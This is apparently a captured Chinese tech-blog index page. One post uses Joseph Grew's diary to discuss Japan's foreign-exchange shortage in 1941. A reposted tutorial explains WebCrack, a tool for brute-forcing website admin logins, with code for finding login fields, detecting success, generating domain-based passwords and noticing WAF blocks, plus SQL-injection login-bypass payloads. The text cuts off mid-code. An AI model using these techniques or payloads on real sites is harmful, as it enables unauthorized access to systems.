+          <p><img src="https://imgs.codewoody.com/uploads/big/93b05a2c7a9935cc6df5ce26784451fc.jpg"></p>
+          <!--noindex-->
+          
+            <div class="post-button text-center">
+              <a class="btn" href="/posts/55277/#more" rel="contents">
+                Read more &raquo;
+              </a>
+            </div>
+          
+          <!--/noindex-->
+        
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    
+
+    
+      
+    
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://www.codewoody.com/posts/49957/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="治部少辅">
+      <meta itemprop="description" content="晚来天雨雪，能饮一杯无？">
+      <meta itemprop="image" content="https://imgs.codewoody.com/uploads/big/0330eb8242d9bfc4873c11450f0ab691.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="治部少辅">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h2 class="post-title" itemprop="name headline">
+                
+                
+                <a href="/posts/49957/" class="post-title-link" itemprop="url">关于珍珠港事件前日本外汇枯竭的考证</a>
+              
+            
+          </h2>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+
+              
+                
+              
+
+              <time title="Created: 2020-01-06 10:41:29" itemprop="dateCreated datePublished" datetime="2020-01-06T10:41:29+08:00">2020-01-06</time>
+            
+
+            
+              
+
+              
+                
+                <span class="post-meta-divider">|</span>
+                
+
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">Edited on</span>
+                
+                <time title="Modified: 2020-01-22 13:23:13" itemprop="dateModified" datetime="2020-01-22T13:23:13+08:00">2020-01-22</time>
+              
+            
+          </span>
+
+          
+
+          
+            
+            
+              
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+            
+                <span class="post-meta-item-text">Comments: </span>
+                <a href="/posts/49957/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count disqus-comment-count" data-disqus-identifier="posts/49957/" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body han-init-context" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <p>在日本偷袭珍珠港事件以前，日本大量从美国尽快必要的战争物资，尤其是石油。在珍珠港事件之前，美国开始执行对日本的物资禁运。很多人因此认为，如果日本不去作这个死，集中全力去解决中国问题，那么抗战胜负，未可知也。</p>
+<p>但大多数普通人不知道的是，事实上到 1941 年日本的外汇储备已经枯竭。也就是说，即便美国不去制裁日本，日本也不会有钱去找美国购买至关重要的战略物资（如石油，橡胶等）。在这种情况下，日本铤而走险，抢占法国、荷兰在东南亚的殖民地以获取战略物资（例如法属印度支那的橡胶和婆罗洲的油田，还包括粮食、铁、有色金属等）就成了无可奈何的必然选择。日本的外汇枯竭，事实上是日本侵略中国导致国力日渐枯竭的后果。这篇文章主要就这一问题进行考证。</p>
+<h2 id="外汇枯竭">外汇枯竭</h2>
+<p>知乎上一个<a href="https://www.zhihu.com/question/284203566" target="_blank" rel="noopener">高赞回答</a>提到了这个问题。</p>
+<blockquote>
+<p>其实原因很明显：日本侵华亏惨了老本，经济濒临崩溃，购买石油、粮食等战略物资的能力已近于枯竭，到1941年，按美国驻日大使的说法，日本可用于支付的外汇只相当于2万德国马克。（约瑟夫。C。格鲁《使日十年》）</p>
+</blockquote>
+<blockquote>
+<p>在中文网络上，搜索关于1941年日本外汇储备的情况也几乎都能追溯到这个引用。不过这个引用细究一下有点奇怪。作者约瑟夫·C·格鲁是美国驻日大使，日本政府的财政状况，他何以清楚呢？毕竟当年不是现在，日本政府、军部应该不会定期公开发布全面的财政报告。</p>
+</blockquote>
+<p><a href="https://book.douban.com/subject/1479333/" target="_blank" rel="noopener">《使日十年》(<i>Ten Years in Japan</i>)</a>，是 1932 年至 1942 年间担任美国驻日大使<a href="https://zh.wikipedia.org/wiki/%E7%BA%A6%E7%91%9F%E5%A4%AB%C2%B7%E6%A0%BC%E9%B2%81" target="_blank" rel="noopener">约瑟夫-C-格鲁(Joseph Clark Grew)</a>的日记及公私文件摘录。该书的英文原版可以在<a href="https://archive.org/details/TenYearsInJapan/page/n327" target="_blank" rel="noopener">这个链接</a>查看。在该链接中，<a href="https://archive.org/details/TenYearsInJapan/page/n399" target="_blank" rel="noopener">第399页</a>，章节 Frozen credits bring japan close to bankruptcy写道:</p>
+<blockquote>
+<p>October 9, 1941</p>
+<p>According to information received by a member of my staff from what is regarded as a very reliable source, <strong>the amount of foreign exchange available to the Japanese Government now is approximately 20,000 reichsmarks</strong>, and under the circumstances the Japanese Government will be unable to avoid defaulting on contracts calling for foreign exchange on maturity. The freezing regulations which were put into effect by the United States, Great Britain, and the Netherlands East Indies have completely cut off any exchange transactions in the currencies of those countries, and in addition have greatly reduced transactions in the currencies of South American countries. According to this information, his own contracts involve foreign exchange totalling approximately five million Swedish kronen, and during recent months Japanese purchases of Swedish goods have been primarily financed through Berlin, persumably through German advanced credits.</p>
+<p>The Japanese have been informed recently by the Germans that these credits are now frozen and are to used only to purchase of German goods. According to our informant it is possible that this action by the Germans was taken in anticipation of Japan's withdrawal from the Axis. According to another soure it is believed that since Sweden is heavily indebted to Germany for armaments, the Germans are now demanding in return from Sweden goods instead of Swedish kronen. Reports are current here that Japan is now eighty million marks in debt to Germany.</p>
+<p>In actual fact Japan is now in virtually the same embarrassing position from the point of view of international finance as are designated foreigners in this country.</p>
+</blockquote>
+<p>这里，作者直接提到了，根据十分可靠的信息来源，日本政府的外汇储备大约是两万德国马克，日本将无力支付外汇合同。由美国，英国和荷兰东印度公司联合制定的冻结条款阻止了日本获得这些国家的货币储备，同时也削弱了日本和南美国家的交易。近几个月以来，日本和瑞士方面的价值五百万瑞士克朗的订单主要在依靠德国的贷款进行支付。不过近期德国告知日本方面日本的贷款也被冻结，而且贷款只能用于从德国购买商品。目前日本已经欠了德国大约八百万马克。这意味着日本的财政即将崩溃。</p>
+<p>一些其他有意思的发现（下面的页码都是前面给出的英文原版链接中的页码）：</p>
+<ol type="1">
+<li>第 326 页: 1941 年，大使已经听到了很多谈论日本将会对珍珠港发动大规模的突然袭击的说法，并且报告了政府。原文是: <i>There is a lot of talk around town to the effect that the Japanese, in case of a break with the United States, are planning to go all out in a surprise attack on Pearl Harbour. Of course I informed our Government.</i></li>
+</ol>
+
+          
+        
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    
+
+    
+      
+    
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://www.codewoody.com/posts/28945/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="治部少辅">
+      <meta itemprop="description" content="晚来天雨雪，能饮一杯无？">
+      <meta itemprop="image" content="https://imgs.codewoody.com/uploads/big/0330eb8242d9bfc4873c11450f0ab691.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="治部少辅">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h2 class="post-title" itemprop="name headline">
+                
+                
+                <a href="/posts/28945/" class="post-title-link" itemprop="url">[转载]网站后台爆破工具: WebCrack</a>
+              
+            
+          </h2>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+
+              
+                
+              
+
+              <time title="Created: 2020-01-02 12:57:07 / Modified: 14:45:23" itemprop="dateCreated datePublished" datetime="2020-01-02T12:57:07+08:00">2020-01-02</time>
+            
+
+            
+              
+
+              
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing"><a href="/categories/黑客/" itemprop="url" rel="index"><span itemprop="name">黑客</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+            
+              
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+            
+                <span class="post-meta-item-text">Comments: </span>
+                <a href="/posts/28945/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count disqus-comment-count" data-disqus-identifier="posts/28945/" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body han-init-context" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <p>这是一篇转载的文章。文章来源是：<a href="https://zhuanlan.zhihu.com/p/89205738" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/89205738</a></p>
+<h2 id="webcrack-简介">WebCrack 简介</h2>
+<p>WebCrack 是一款开源免费的web后台弱口令/万能密码批量爆破、检测工具。</p>
+<p>不仅支持如discuz，织梦，phpmyadmin等主流CMS的后台爆破，并且对于绝大多数小众CMS甚至个人开发网站后台都有效果，只需在工具中导入后台地址即可进行自动化检测。</p>
+<h2 id="使用方法">使用方法</h2>
+<h3 id="下载">下载</h3>
+<p>GitHub 项目: <a href="https://github.com/yzddmr6/WebCrack" target="_blank" rel="noopener">https://github.com/yzddmr6/WebCrack</a>。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/yzddmr6/WebCrack</span><br></pre></td></tr></table></figure>
+<h3 id="安装所需依赖">安装所需依赖</h3>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip3 install -r requirements.txt</span><br></pre></td></tr></table></figure>
+<h3 id="运行脚本">运行脚本</h3>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> python webcrack.py </span></span><br><span class="line">*****************************************************</span><br><span class="line">*　　　　　　　　　　　　　　　　　　　　　　 　    * </span><br><span class="line">****************    Code By yzddMr6   ***************</span><br><span class="line">*　　　　　　　　　　　　　　　　　　　　　　 　    *</span><br><span class="line">*****************************************************</span><br><span class="line">File or Url:</span><br></pre></td></tr></table></figure>
+<p>输入文件名则进行批量爆破，输入 URL 则进行单域名爆破。</p>
+<h3 id="自定义配置">自定义配置</h3>
+<p>在 <code>cms.json</code>里面可以进行自定义配置</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"name"</span>: <span class="string">"这是cms的名称"</span>,</span><br><span class="line">    <span class="attr">"keywords"</span>: <span class="string">"这里是cms后台页面的关键字，是识别cms的关键"</span>,</span><br><span class="line">    <span class="attr">"captcha"</span>: <span class="string">"1 为后台有验证，0 为没有。因为此版本并没有处理验证码，所以为 1 则退出爆破"</span>,</span><br><span class="line">    <span class="attr">"exp_able"</span>: <span class="string">"是否启用万能密码模块爆破"</span>,</span><br><span class="line">    <span class="attr">"success_flag"</span>: <span class="string">"登录成功过后的关键字"</span>,</span><br><span class="line">    <span class="attr">"fail_flag"</span>: <span class="string">"请谨慎填写此项。如果填写此项，遇到里面的关键字就会退出爆破，用于 dz 等对于爆破有次数限制的cms"</span>,</span><br><span class="line">    <span class="attr">"alert"</span>: <span class="string">"若为 1 则会打印下面的 note 内容"</span>,</span><br><span class="line">    <span class="attr">"note"</span>: <span class="string">"请保证本文件是 UTF 格式，并且请勿删除此说明"</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>文件里面给出了集中常见的 cms 的配置方案，可进行参考。</p>
+<h2 id="原理分析">原理分析</h2>
+<p>根据我们平时使用burpsuite中的爆破的原理，可知webcrack的爆破原理与其差异不大，自动分析找到爆破点、带入字典进行匹配、判断是否成功。</p>
+<h3 id="寻找爆破点">寻找爆破点</h3>
+<p>根据提取到的参数名来匹配用户名和密码的位置（缺陷：可能不包含在已设定的选项中）</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> content.find_all(<span class="string">'input'</span>):</span><br><span class="line">    ok_flag = <span class="number">0</span></span><br><span class="line">    <span class="keyword">if</span> x.has_attr(<span class="string">'name'</span>):</span><br><span class="line">        parameter = x[<span class="string">'name'</span>]</span><br><span class="line">    <span class="keyword">elif</span> x.has_attr(<span class="string">'id'</span>):</span><br><span class="line">        parameter = x[<span class="string">'id'</span>]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        parameter = <span class="string">''</span></span><br><span class="line">    <span class="keyword">if</span> x.has_attr(<span class="string">'value'</span>):</span><br><span class="line">        value = x[<span class="string">'value'</span>]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        value = <span class="string">'0000'</span></span><br><span class="line">    <span class="keyword">if</span> paramter:</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> user_key:</span><br><span class="line">            <span class="keyword">for</span> z <span class="keyword">in</span> [<span class="string">'user'</span>, <span class="string">'name'</span>, <span class="string">'zhanghao'</span>, <span class="string">'yonghu'</span>, <span class="string">'email'</span>,.<span class="string">'account'</span>]:</span><br><span class="line">                <span class="keyword">if</span> z <span class="keyword">in</span> paramter.lower():</span><br><span class="line">                    value = <span class="string">'&#123;username&#125;'</span></span><br><span class="line">                    user_key = parameter</span><br><span class="line">                    ok_flag = <span class="number">1</span></span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> ok_flag:</span><br><span class="line">            <span class="keyword">for</span> y <span class="keyword">in</span> [<span class="string">'pass'</span>, <span class="string">'pw'</span>, <span class="string">'mima'</span>]:</span><br><span class="line">                <span class="keyword">if</span> y <span class="keyword">in</span> parameter.lower():</span><br><span class="line">                    value = <span class="string">'&#123;pass_word&#125;'</span></span><br><span class="line">                    pass_key = parameter</span><br><span class="line">                    ok_flag = <span class="number">1</span></span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">        data[parameter] = str(value)</span><br></pre></td></tr></table></figure>
+<h3 id="判断是否成功">判断是否成功</h3>
+<p>原理就是先对两个错误请求的返回值进行比较，如果不同，则无法进行判断，退出爆破；如果相同，则记录下来作为判断的标准。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_error_length</span><span class="params">(conn, path, data)</span>:</span></span><br><span class="line">    data1 = data</span><br><span class="line">    cookie_error_flag = <span class="number">0</span></span><br><span class="line">    dynamic_reg_len = <span class="number">0</span></span><br><span class="line">    data2 = str(data1.replace(<span class="string">'%7Buser_name%7D'</span>, <span class="string">'admin'</span>))</span><br><span class="line">    data2 = str(data2.replace(<span class="string">'%7Bpass_word%7D'</span>, <span class="string">'length_test'</span>))</span><br><span class="line">    res_test = conn.post(url=path, data=data2, headers=random_headers(), timeout=<span class="number">10</span>, verify=<span class="keyword">False</span>,</span><br><span class="line">        allow_redirects=<span class="keyword">True</span>, proxies=requests_proxies()) <span class="comment"># 先请求一次</span></span><br><span class="line">    res_02 = conn.post(url=path, data=data2, headers=random_headers(), timeout=<span class="number">10</span>, verify=<span class="keyword">False</span>,</span><br><span class="line">        allow_redirects=<span class="keyword">True</span>, proxies=requests_proxies())</span><br><span class="line">    res_02.encoding = res_02.apparent_encoding</span><br><span class="line">    res = conn.post(url=path, data=data2, headers=random_headers(), timeout=<span class="number">10</span>, verify=<span class="keyword">False</span>, allow_redirects=<span class="keyword">True</span>,</span><br><span class="line">        proxies=requests_proxies())</span><br><span class="line">    res.encoding = res.apparent_encoding</span><br><span class="line">    error_length_02 = len(res_02.text + str(res_02.headers))</span><br><span class="line">    error_length = len(res.text + str(res.headers))</span><br><span class="line">    <span class="keyword">if</span> error_length_02 != error_length:</span><br><span class="line">        cookies_error_flag = <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> error_length, cookie_error_flag, dynamic_req_len</span><br></pre></td></tr></table></figure>
+<p>根据黑名单判断，出现黑名单中的情况判定为爆破失败</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fail_words = [<span class="string">'密码错误'</span>, <span class="string">'重试'</span>, <span class="string">'不正确'</span>, <span class="string">'密码有误'</span>,<span class="string">'不成功'</span>, <span class="string">'重新输入'</span>, <span class="string">'history.back'</span>, <span class="string">'不存在'</span>, <span class="string">'登录失败'</span>, <span class="string">'登陆失败'</span>,<span class="string">'出错'</span>, <span class="string">'已被锁定'</span>,<span class="string">'history.go'</span>,<span class="string">'安全拦截'</span>,<span class="string">'还可以尝试'</span>,<span class="string">'无效'</span>,<span class="string">'攻击行为'</span>,<span class="string">'创宇盾'</span>, <span class="string">'非法'</span>,<span class="string">'百度云加速'</span>,<span class="string">'安全威胁'</span>,<span class="string">'防火墙'</span>,<span class="string">'黑客'</span>, <span class="string">'不合法'</span>,<span class="string">'warning.asp?msg='</span>,<span class="string">'Denied'</span>]</span><br></pre></td></tr></table></figure>
+<p>为了提高准确度，防止误报，还有重新检查的环节。就是再次把爆破出的帐号密码发送一次，将返回值与一个新的错误返回值进行对比，如果不同，则表示爆破成功。（为什么不使用前面记录下来的错误返回值进行对比，因为WAF的存在或其他因素的干扰会导致返回值的变化）</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">recheck</span><span class="params">(path, data, user_name, pass_word)</span>:</span></span><br><span class="line">    data1 = data</span><br><span class="line">    conn = requests.session()</span><br><span class="line">    pass_word = str(pass_word.replace(<span class="string">'&#123;user&#125;'</span>, user_name))</span><br><span class="line"></span><br><span class="line">    data_test = str(data1.replace(<span class="string">'%7Buser_name%7D'</span>, user_name))</span><br><span class="line">    data_test = str(data_test.replace(<span class="string">'%7Bpass_word%7D'</span>, <span class="string">'length_test'</span>))</span><br><span class="line"></span><br><span class="line">    data2 = str(data1.replace(<span class="string">'%7Buser_name%7D'</span>, user_name))</span><br><span class="line">    data2 = str(data2.replace(<span class="string">'%7Bpass_word%7D'</span>, pass_word))</span><br><span class="line"></span><br><span class="line">    res_01 = conn.post(url=path, data=data_test, headers=random_headers(), timeout=<span class="number">10</span>, verify=<span class="keyword">False</span>,</span><br><span class="line">                       allow_redirects=<span class="keyword">False</span>, proxies=requests_proxies())</span><br><span class="line">    res_02 = conn.post(url=path, data=data2, headers=random_headers(), timeout=<span class="number">10</span>, verify=<span class="keyword">False</span>,</span><br><span class="line">                       allow_redirects=<span class="keyword">False</span>, proxies=requests_proxies())</span><br><span class="line">    res_01.encoding = res_01.apparent_encoding</span><br><span class="line">    res_02.encoding = res_02.apparent_encoding</span><br><span class="line">    error_length_01 = len(res_01.text+str(res_01.headers))</span><br><span class="line">    error_length_02 = len(res_02.text+str(res_02.headers))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> error_length_01 == error_length_02:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span></span><br></pre></td></tr></table></figure>
+<h3 id="动态词典">动态词典</h3>
+<p>根据域名自动生成动态词典</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gen_dynam_dic</span><span class="params">(url)</span>:</span></span><br><span class="line">    dynam_pass_dic = []</span><br><span class="line">    tmp_dic = []</span><br><span class="line">    suffix_dic = [<span class="string">''</span>, <span class="string">'123'</span>, <span class="string">'888'</span>, <span class="string">'666'</span>, <span class="string">'123456'</span>]</span><br><span class="line">    list1 = url.split(<span class="string">'/'</span>)</span><br><span class="line">    host = list1[<span class="number">2</span>].split(<span class="string">":"</span>)[<span class="number">0</span>]</span><br><span class="line">    compile_ip = re.compile(<span class="string">'^(1\d&#123;2&#125;|2[0-4]\d|25[0-5]|[1-9]\d|[1-9])\.(1\d&#123;2&#125;|2[0-4]\d|25[0-5]|[1-9]\d|\d)\.(1\d&#123;2&#125;|2[0-4]\d|25[0-5]|[1-9]\d|\d)\.(1\d&#123;2&#125;|2[0-4]\d|25[0-5]|[1-9]\d|\d)$'</span>)</span><br><span class="line">    <span class="keyword">if</span> compile_ip.match(host):</span><br><span class="line">        check_ip = <span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        check_ip = <span class="number">0</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> check_ip:</span><br><span class="line">        list2 = host.split(<span class="string">"."</span>)</span><br><span class="line">        i = len(list2)</span><br><span class="line">        <span class="keyword">for</span> u <span class="keyword">in</span> range(i):  <span class="comment"># 生成url字典1</span></span><br><span class="line">            list3 = list2[u:]</span><br><span class="line">            part = <span class="string">'.'</span>.join(list3)</span><br><span class="line">            <span class="keyword">if</span> (len(part) &lt; <span class="number">5</span>):</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            dynam_pass_dic.append(part)</span><br><span class="line">        <span class="keyword">for</span> u <span class="keyword">in</span> range(i):  <span class="comment"># 生成url字典2</span></span><br><span class="line">            list3 = list2[u]</span><br><span class="line">            <span class="keyword">if</span> len(list3) &lt; <span class="number">5</span>:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            tmp_dic.append(list3)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> tmp_dic:</span><br><span class="line">            <span class="keyword">for</span> suffix <span class="keyword">in</span> suffix_dic:</span><br><span class="line">                u = i + suffix</span><br><span class="line">                dynam_pass_dic.append(u)</span><br><span class="line">        <span class="keyword">return</span> dynam_pass_dic</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">''</span></span><br></pre></td></tr></table></figure>
+<p>如果输入的是一个 IP，则返回一个空的列表。</p>
+<h3 id="万能密码">万能密码</h3>
+<p>除了弱口令以外，还可能存在万能密码的漏洞，WebCrack中添加了一些常用的payload用来检测是否存在万能密码的漏洞。（缺陷：可能会被WAF拦截）</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">exp_user_dic = [<span class="string">"admin' or 'a'='a"</span>, <span class="string">"'or'='or'"</span>, <span class="string">"admin' or '1'='1' or 1=1"</span>, <span class="string">"')or('a'='a"</span>, <span class="string">"'or 1=1--"</span>]</span><br><span class="line">exp_pass_dic = exp_user_dic</span><br><span class="line"></span><br><span class="line"><span class="comment"># ...</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> exp_able:</span><br><span class="line">    user_dic=exp_user_dic</span><br><span class="line">    pass_dic=exp_pass_dic</span><br><span class="line">    print(<span class="string">'Exp_dic is trying'</span>)</span><br><span class="line">    user_name, pass_word = crack_task( path, data, user_dic, pass_dic,user_key,pass_key,cms_id)</span><br><span class="line">    <span class="keyword">if</span> user_name:</span><br><span class="line">        print(<span class="string">"Rechecking......"</span>,url, user_name, pass_word)</span><br><span class="line">        recheck_flag = recheck(path, data, user_name, pass_word)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        recheck_flag = <span class="number">0</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    recheck_flag = <span class="number">0</span></span><br></pre></td></tr></table></figure>
+<h3 id="验证码">验证码</h3>
+<p>这部分自动化完成比较困难，这里只提供了一个简单的解决方案</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">captchas = [<span class="string">'验证码'</span>, <span class="string">'验 证 码'</span>,<span class="string">'点击更换'</span>, <span class="string">'点击刷新'</span>,<span class="string">'看不清'</span>,<span class="string">'认证码'</span>,<span class="string">'安全问题'</span>]</span><br><span class="line"><span class="keyword">if</span> cms_id  <span class="keyword">and</span>  cms[cms_id][<span class="string">'captcha'</span>] == <span class="number">1</span>:</span><br><span class="line">    print(<span class="string">"[-] captcha in login page: "</span> + url + <span class="string">'\n'</span>,time.strftime(<span class="string">'%Y-%m-%d %X'</span>, time.localtime(time.time())))</span><br><span class="line">    <span class="keyword">with</span> open(log_file, <span class="string">'a+'</span>) <span class="keyword">as</span> log:</span><br><span class="line">        log.write(<span class="string">"[-] captcha in login page: "</span>  + url + <span class="string">'\n'</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> cms_id :</span><br><span class="line">        <span class="keyword">for</span> captcha <span class="keyword">in</span> captchas:</span><br><span class="line">            <span class="keyword">if</span> captcha <span class="keyword">in</span> html:</span><br><span class="line">                print(<span class="string">"[-]"</span> + captcha + <span class="string">" in login page: "</span> + url + <span class="string">'\n'</span>,time.strftime(<span class="string">'%Y-%m-%d %X'</span>, time.localtime(time.time())))</span><br><span class="line">                <span class="keyword">with</span> open(log_file, <span class="string">'a+'</span>) <span class="keyword">as</span> log:</span><br><span class="line">                    log.write(<span class="string">"[-]"</span> + captcha 